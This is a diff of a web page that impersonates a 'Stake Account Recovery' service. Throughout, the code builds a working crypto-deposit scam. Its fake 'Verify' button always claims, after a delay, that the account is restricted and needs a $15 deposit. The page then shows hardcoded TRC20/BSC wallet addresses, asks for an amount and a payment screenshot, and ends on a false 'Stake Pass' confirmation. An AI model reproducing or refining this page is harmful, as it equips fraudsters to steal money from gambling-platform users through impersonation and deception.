@@ -6,56 +6,69 @@
   <title>Stake Account Recovery</title>
   <style>
     body {
-      background-color: #0f0f0f;
-      color: #ffffff;
+      background-color: #0e0e0e;
+      color: #fff;
       font-family: Arial, sans-serif;
       padding: 20px;
     }
     .container {
       max-width: 500px;
       margin: auto;
-      background: #1a1a1a;
+      background: #1c1c1c;
       padding: 20px;
       border-radius: 10px;
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 10px rgba(0,0,0,0.6);
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
     }
     input, select, button {
       width: 100%;
-      margin: 10px 0;
       padding: 10px;
+      margin-top: 10px;
       border: none;
       border-radius: 5px;
       font-size: 16px;
     }
     button {
-      background-color: #4caf50;
+      background-color: #4CAF50;
       color: white;
       cursor: pointer;
     }
     button:disabled {
-      background-color: #888;
+      background-color: #555;
       cursor: not-allowed;
     }
-    .address-container {
-      display: flex;
-      align-items: center;
-      gap: 10px;
+    .readonly-input {
+      background-color: #333;
+      color: #fff;
     }
-    #popup {
+    .copy-btn {
+      background-color: #333;
+      color: white;
+      border: none;
+      margin-top: 5px;
+      cursor: pointer;
+    }
+    .message, .popup {
+      margin-top: 15px;
+      padding: 10px;
+      background-color: #222;
+      border-left: 5px solid #4CAF50;
+    }
+    .popup {
       display: none;
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0, 0, 0, 0.8);
-      justify-content: center;
-      align-items: center;
-    }
-    #popup-message {
-      background: #1a1a1a;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #1c1c1c;
       padding: 20px;
       border-radius: 10px;
+      z-index: 1000;
+      width: 90%;
+      max-width: 400px;
       text-align: center;
     }
   </style>
@@ -63,14 +76,13 @@
 <body>
   <div class="container">
     <h2>Account Recovery</h2>
+    <label>Username:</label>
+    <input type="text" id="username" placeholder="Enter your Stake username">
+    <button onclick="verifyUsername()">Verify</button>
+    <div id="verifyMessage" class="message" style="display:none"></div>
 
-    <label>Username</label>
-    <input type="text" id="username" placeholder="Enter your Stake username" />
-    <button id="verifyBtn">Verify</button>
-    <p id="verifyMsg" style="display:none; color:lightgreen;"></p>
-
-    <label>Coin</label>
-    <select id="coin">
+    <label>Coin:</label>
+    <select id="coin" onchange="updateAddress()">
       <option value="">Select Coin</option>
       <option value="USDT">USDT</option>
       <option value="BTC">BTC</option>
@@ -78,95 +90,102 @@
       <option value="Ethereum">Ethereum</option>
     </select>
 
-    <label>Network</label>
-    <select id="network">
+    <label>Network:</label>
+    <select id="network" onchange="updateAddress()">
       <option value="">Select Network</option>
       <option value="TRC20">TRC20</option>
       <option value="BSC">BSC</option>
     </select>
 
-    <label>Wallet Address</label>
-    <div class="address-container">
-      <input type="text" id="address" readonly />
-      <button onclick="copyAddress()">Copy</button>
-    </div>
+    <label>Address:</label>
+    <input type="text" id="address" class="readonly-input" readonly>
+    <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
 
-    <label>Amount ($)</label>
-    <input type="number" id="amount" placeholder="Enter deposit amount" />
+    <label>Amount ($):</label>
+    <input type="number" id="amount" placeholder="Enter amount">
 
-    <label>Upload Screenshot</label>
-    <input type="file" id="screenshot" accept="image/*" />
+    <label>Upload Screenshot:</label>
+    <input type="file" id="screenshot">
 
-    <button id="submitBtn" disabled>Submit</button>
+    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
   </div>
 
-  <div id="popup">
-    <div id="popup-message">
-      <p>Your account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.</p>
-      <button onclick="closePopup()">OK</button>
-    </div>
+  <div class="popup" id="popup">
+    <p>Your account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.</p>
+    <button onclick="closePopup()">OK</button>
   </div>
 
   <script>
-    const addressMap = {
-      "USDT-TRC20": "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
-      "USDT-BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
-      "BTC-BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
-      "TRX-TRC20": "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
-      "TRX-BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
-      "Ethereum-BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c"
+    const addresses = {
+      USDT: {
+        TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
+        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
+      },
+      BTC: {
+        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
+      },
+      TRX: {
+        TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
+        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
+      },
+      Ethereum: {
+        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
+      }
     };
-
-    document.getElementById("verifyBtn").onclick = () => {
-      document.getElementById("verifyMsg").style.display = "block";
-      document.getElementById("verifyMsg").innerText = "Verifying...";
-      setTimeout(() => {
-        document.getElementById("verifyMsg").innerText =
-          "Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.";
-        checkFormCompletion();
-      }, 1000);
-    };
-
-    document.getElementById("coin").onchange = updateAddress;
-    document.getElementById("network").onchange = updateAddress;
 
     function updateAddress() {
       const coin = document.getElementById("coin").value;
       const network = document.getElementById("network").value;
-      const key = `${coin}-${network}`;
-      document.getElementById("address").value = addressMap[key] || "";
-      checkFormCompletion();
+      const addressInput = document.getElementById("address");
+      if (addresses[coin] && addresses[coin][network]) {
+        addressInput.value = addresses[coin][network];
+      } else {
+        addressInput.value = "";
+      }
+      checkFields();
     }
 
     function copyAddress() {
       const address = document.getElementById("address");
       address.select();
-      address.setSelectionRange(0, 99999);
       document.execCommand("copy");
+      alert("Address copied to clipboard");
     }
 
-    function checkFormCompletion() {
-      const username = document.getElementById("username").value.trim();
-      const verified = document.getElementById("verifyMsg").innerText.includes("Stake account is in withdraw-only");
+    function verifyUsername() {
+      const username = document.getElementById("username").value;
+      if (username) {
+        const msg = document.getElementById("verifyMessage");
+        msg.style.display = "block";
+        msg.innerHTML = "Verifying...";
+        setTimeout(() => {
+          msg.innerHTML = "Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.";
+          checkFields();
+        }, 1500);
+      }
+    }
+
+    function checkFields() {
+      const username = document.getElementById("username").value;
       const coin = document.getElementById("coin").value;
       const network = document.getElementById("network").value;
       const address = document.getElementById("address").value;
       const amount = document.getElementById("amount").value;
       const screenshot = document.getElementById("screenshot").files.length;
-      const isValid = username && verified && coin && network && address && amount && screenshot;
-      document.getElementById("submitBtn").disabled = !isValid;
+      const verified = document.getElementById("verifyMessage").innerHTML.includes("withdraw-only mode");
+      document.getElementById("submitBtn").disabled = !(username && coin && network && address && amount && screenshot && verified);
     }
 
     document.querySelectorAll("input, select").forEach(el => {
-      el.oninput = el.onchange = checkFormCompletion;
+      el.addEventListener("change", checkFields);
+      el.addEventListener("input", checkFields);
     });
 
-    document.getElementById("submitBtn").onclick = () => {
-      document.getElementById("popup").style.display = "flex";
-    };
+    function submitForm() {
+      document.getElementById("popup").style.display = "block";
+    }
 
     function closePopup() {
-      document.getElementById("popup").style.display = "none";
       location.reload();
     }
   </script>
